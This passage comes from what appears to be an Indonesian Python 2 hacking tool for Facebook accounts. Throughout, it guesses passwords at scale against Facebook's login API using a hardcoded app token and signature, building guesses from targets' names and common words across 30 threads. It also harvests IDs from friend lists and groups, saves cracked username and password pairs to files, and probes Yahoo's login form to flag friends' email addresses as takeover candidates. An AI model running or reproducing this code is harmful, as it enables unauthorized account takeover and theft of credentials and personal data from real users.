                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                    menu_hack()
                                else:
                                    pz7 = 'anjing'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    y = json.load(data)
                                    if 'access_token' in y:
                                        print '\x1b[1;91m[+] \x1b[1;92mFound'
                                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz7
                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                        menu_hack()
                                    elif 'www.facebook.com' in y['error_msg']:
                                        print '\x1b[1;91m[+] \x1b[1;92mFound'
                                        print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                        menu_hack()
                                    else:
                                        print '\x1b[1;91m[!] Sorry, failed to open the target password :('
                                        print '\x1b[1;91m[!] try it another way.'
                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                        menu_hack()
        except KeyError:
            print '\x1b[1;91m[!] Terget not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_hack()


def crack():
    global file
    global idlist
    global passw
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print logo
        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mList ID  \x1b[1;91m: \x1b[1;97m')
        print '\x1b[1;91m[+] \x1b[1;92mList Found  \x1b[1;91m: \x1b[1;97m'
        time.sleep(5)
        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword Crack \x1b[1;91m: \x1b[1;97m')
        try:
            file = open(idlist, 'r')
            jalan('\x1b[1;91m[+] \x1b[1;92mStart \x1b[1;97m...')
            for x in range(30):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()


def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        os.mkdir('out')
    except OSError:
        pass
    else:
        try:
            buka = open(idlist, 'r')
            up = buka.read().split()
            while file:
                username = file.readline().strip()
                url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                data = urllib.urlopen(url)
                mpsh = json.load(data)
                if back == len(up):
                    break
                if 'access_token' in mpsh:
                    bisa = open('out/anjas.txt', 'w')
                    bisa.write(username + '|' + passw + '\n')
                    bisa.close()
                    x = requests.get('https://graph.facebook.com/' + username + '?access_token=' + mpsh['access_token'])
                    z = json.loads(x.text)
                    berhasil.append('\x1b[1;97m[ \x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m ] ' + username + '|' + passw + ' =>' + z['name'])
                elif 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('out/mbf_cp.txt', 'w')
                    cek.write(username + '|' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[1;97m[ \x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m ] ' + username + '|' + passw)
                else:
                    gagal.append(username)
                    back += 1
                sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m+\x1b[1;91m] \x1b[1;92mCracking    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' |\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m|\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
                sys.stdout.flush()

        except IOError:
            print '\n\x1b[1;91m[!] Sleep'
            time.sleep(0.01)
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'


def hasil():
    print
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[31m[x] Failed \x1b[1;97m--> ' + str(len(gagal))
    keluar()


def super():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.0)
        login()

    os.system('reset')
    print logo
    print '\x1b[1;97m[ 1 ]. from With list friend'
    print '\x1b[1;97m[ 2 ]. from With ID friend'
    print '\x1b[1;97m[ 3 ]. from Group ID'
    print '\x1b[1;97m[ 4 ]. from list id'
    print '\n\x1b[1;91m[ 0 ]. Exit'
    pilih_super()


def pilih_super():
    peak = raw_input('\x1b[1;97m\x1b[1;91m>>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;91m[!] Wrong input'
        pilih_super()
    elif peak == '1':
        os.system('reset')
        print logo
        jalan('[#] \x1b[1;92mGettings ID Friends\x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif peak == '2':
        os.system('reset')
        print logo
        idt = raw_input('[+] \x1b[1;92mID friend : \x1b[1;97m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;96m+\x1b[1;91m] \x1b[1;92mFriends Found'
        except KeyError:
            print '\x1b[1;91m[!] Friend not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            super()

        jalan('[+] Getting ID ...')
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    elif peak == '3':
        os.system('reset')
        print logo
        idg = raw_input('[+] \x1b[1;92mID group \x1b[1;91m:\x1b[1;97m ')
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
            asw = json.loads(r.text)
        except KeyError:
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            super()

        re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=9999999999999&access_token=' + toket)
        s = json.loads(re.text)
        for p in s['data']:
            id.append(p['id'])

    elif peak == '4':
        os.system('reset')
        print logo
        try:
            idlist = raw_input('[+] \x1b[1;92mList ID  \x1b[1;91m: \x1b[1;97m')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except KeyError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            super()

    elif peak == '0':
        menu()
    else:
        print '\x1b[1;91m[!] Wrong input'
        super()
    print '[+] \x1b[1;92mSucces Get ID : \x1b[1;97m' + str(len(id))
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r[#] \x1b[1;92mCracking \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print 42 * '\x1b[1;97m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass
        else:
            try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                    z = json.loads(x.text)
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + '|' + pass1
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + user + '|' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                        z = json.loads(x.text)
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + '|' + pass2
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + user + '|' + pass2
                    else:
                        pass3 = b['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                            z = json.loads(x.text)
                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + '|' + pass3
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + user + '|' + pass3
                        else:
                            pass4 = 'sayang'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                z = json.loads(x.text)
                                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + '|' + pass4
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + user + '|' + pass4
                            else:
                                pass5 = b['first_name'] + 'ganteng'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                    z = json.loads(x.text)
                                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + '|' + pass5
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + user + '|' + pass5
                                else:
                                    pass6 = b['first_name'] + 'cantik'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                        z = json.loads(x.text)
                                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + '|' + pass6
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + user + '|' + pass6
                                    else:
                                        a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                        b = json.loads(a.text)
                                        pass7 = 'anjing'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                            z = json.loads(x.text)
                                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m] ' + user + '|' + pass7
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m\x1b[1;93m[CP]\x1b[1;97m ' + user + '|' + pass7
            except:
                pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '[ Done ] Crack Acount '
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    super()


def yahoo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    print '\x1b[1;97m1.\x1b[1;93m Clone dari daftar teman'
    print '\x1b[1;97m2.\x1b[1;93m Clone dari teman'
    print '\x1b[1;97m3.\x1b[1;93m Clone dari member group'
    print '\x1b[1;97m4.\x1b[1;93m Clone dari file'
    print '\n\x1b[1;91m0.\x1b[1;91m Kembali'
    clone()


def clone():
    embuh = raw_input('\n\x1b[1;97m >>> ')
    if embuh == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
    elif embuh == '1':
        clone_dari_daftar_teman()
    elif embuh == '2':
        clone_dari_teman()
    elif embuh == '3':
        clone_dari_member_group()
    elif embuh == '4':
        clone_dari_file()
    elif embuh == '0':
        menu()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'


def clone_dari_daftar_teman():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print 42 * '\x1b[1;96m='
    jalan('\x1b[1;96m[\x1b[1;97m\xe2\x9c\xba\x1b[1;96m] \x1b[1;93mMengambil email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    jalan('\x1b[1;96m[\x1b[1;97m\xe2\x9c\xba\x1b[1;96m] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID   \x1b[1;91m: \x1b[1;92m' + id
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mNama \x1b[1;91m: \x1b[1;92m' + nama + '\n'
                    save = open('out/MailVuln.txt', 'a')
                    save.write('Nama : ' + nama + '\nID        : ' + id + '\nEmail  : ' + mail + '\n\n')
                    save.close()
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/MailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def clone_dari_teman():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

        os.system('clear')
        print logo
        mpsh = []
        jml = 0
        print 42 * '\x1b[1;96m='
        idt = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID teman \x1b[1;91m: \x1b[1;97m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;96m[!] \x1b[1;91mTeman tidak ditemukan'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()

    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 43 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID   \x1b[1;91m: \x1b[1;92m' + id
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mNama \x1b[1;91m: \x1b[1;92m' + nama
                    save = open('out/TemanMailVuln.txt', 'a')
                    save.write('Nama : ' + nama + '\nID        : ' + id + '\nEmail  : ' + mail + '\n\n')
                    save.close()
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/TemanMailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def clone_dari_member_group():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

        os.system('clear')
        print logo
        mpsh = []
        jml = 0
        print 42 * '\x1b[1;96m='
        id = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID group \x1b[1;91m:\x1b[1;97m ')
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;96m[!] \x1b[1;91mGroup tidak ditemukan'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()

    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    kimak = json.loads(teman.text)
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID   \x1b[1;91m: \x1b[1;92m' + id
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mNama \x1b[1;91m: \x1b[1;92m' + nama
                    save = open('out/GrupMailVuln.txt', 'a')
                    save.write('Nama : ' + nama + '\nID        : ' + id + '\nEmail  : ' + mail + '\n\n')
                    save.close()
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/GrupMailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def clone_dari_file():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        files = raw_input('\x1b[1;96m[+] \x1b[1;93mNama File \x1b[1;91m: \x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()

    mpsh = []
    jml = 0
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mVULN'
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mEmail\x1b[1;91m: \x1b[1;92m' + mail
                save = open('out/MailVuln.txt', 'a')
                save.write('Email: ' + mail + '\n\n')
                save.close()
                berhasil.append(mail)

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile Tersimpan \x1b[1;91m:\x1b[1;97m out/FileMailVuln.txt'
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('out/Grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mGROUP SAYA'
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID  \x1b[1;91m: \x1b[1;92m' + str(id)
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mNama\x1b[1;91m: \x1b[1;92m' + str(nama) + '\n'

            print 42 * '\x1b[1;96m='
            print '\x1b[1;96m[+] \x1b[1;92mTotal Group \x1b[1;91m:\x1b[1;97m %s' % len(listgrup)
            print '\x1b[1;96m[+] \x1b[1;92mTersimpan \x1b[1;91m: \x1b[1;97mout/Grupid.txt'
            f.close()
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;96m[!] \x1b[1;91mTerhenti'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()
        except KeyError:
            os.remove('out/Grupid.txt')
            print '\x1b[1;96m[!] \x1b[1;91mGroup tidak ditemukan'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;91mTidak ada koneksi'
            keluar()
        except IOError:
            print '\x1b[1;96m[!] \x1b[1;91mError'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()


def guard():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('reset')
    print logo
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m1.\x1b[1;97m Activate'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;92m2.\x1b[1;97m Not activate'
    print '\x1b[1;97m\xe2\x95\x91--\x1b[1;91m> \x1b[1;91m0.\x1b[1;97m Back'
    print '\xe2\x95\x91'
    g = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m>>\x1b[1;97m')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    elif g == '2':
        non = 'false'
        gaz(toket, non)
    elif g == '0':
        lain()
    elif g == '':
        keluar()
    else:
        keluar()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
